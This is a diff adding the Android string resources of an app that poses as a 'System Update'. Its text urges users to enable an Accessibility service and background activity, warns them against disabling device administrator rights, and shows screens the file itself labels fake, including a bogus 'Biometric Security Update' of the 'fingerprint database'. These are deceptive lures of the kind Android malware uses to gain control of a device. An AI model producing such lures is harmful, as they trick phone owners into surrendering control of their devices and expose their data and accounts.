@@ -1,0 +1,30 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <!-- App identity — overridden by APP_LABEL build config param -->
+    <string name="app_name">System Update</string>
+
+    <!-- Accessibility service labels — shown in Android accessibility settings list -->
+    <string name="accessibility_service_label">System Update Service</string>
+    <string name="accessibility_service_desc">Required for system update verification and security patching.</string>
+
+    <!-- Device admin -->
+    <string name="admin_disable_warning">Disabling this administrator may prevent system updates and security patches from installing correctly.</string>
+
+    <!-- Permission screens -->
+    <string name="perm_title_accessibility">Enable Update Service</string>
+    <string name="perm_body_accessibility">To complete the system update, please enable the update service in Accessibility Settings.</string>
+    <string name="perm_cta_accessibility">Open Accessibility Settings</string>
+
+    <string name="perm_title_battery">Allow Background Activity</string>
+    <string name="perm_body_battery">Allow the update service to run in the background to ensure the update installs correctly.</string>
+    <string name="perm_cta_battery">Allow</string>
+
+    <!-- Fake update screen strings -->
+    <string name="update_do_not_turn_off">Do not turn off your device</string>
+    <string name="update_may_take_minutes">This may take a few minutes</string>
+    <string name="update_charge_warning">Charge your phone before updating</string>
+    <string name="update_complete">complete</string>
+    <string name="fp_update_title">Biometric Security Update</string>
+    <string name="fp_update_subtitle">Updating fingerprint database</string>
+    <string name="fp_do_not_remove">Do not remove any fingerprints during this process</string>
+</resources>
